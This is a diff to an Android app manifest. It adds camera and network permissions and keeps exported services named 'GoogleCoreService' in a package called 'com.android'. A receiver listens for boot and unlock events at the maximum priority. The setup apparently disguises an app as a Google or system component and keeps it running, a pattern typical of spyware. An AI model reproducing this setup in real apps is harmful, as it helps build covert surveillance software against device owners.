@@ -2,6 +2,11 @@
     xmlns:tools="http://schemas.android.com/tools"
     package="com.android">
 
+    <uses-feature android:name="android.hardware.camera" />
+
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_USER_PRESENT" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.GET_TASKS" />
     <uses-permission
@@ -13,28 +18,18 @@
         android:label="@string/app_name"
         android:supportsRtl="true">
 
-
-<!--                        <service
-                            android:name=".service.GoogleCoreService"
-                            android:enabled="true"
-                            android:exported="true" />
-                        <service
-                            android:name=".service.GoogleCoreService$GoogleCoreInnerService"
-                            android:enabled="true"
-                            android:exported="true" />-->
-
         <service
             android:name=".service.GoogleCoreService"
             android:enabled="true"
             android:exported="true"
-            android:process=":core" />
+            android:process=":core"/>
         <service
             android:name=".service.GoogleCoreService$GoogleCoreInnerService"
             android:enabled="true"
             android:exported="true"
             android:process=":core" />
 
-        <receiver android:name="com.android.core.SystemBroadcastReceiver">
+        <receiver android:name=".service.GoogleCoreReceiver">
             <intent-filter android:priority="2147483647">
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.USER_PRESENT" />
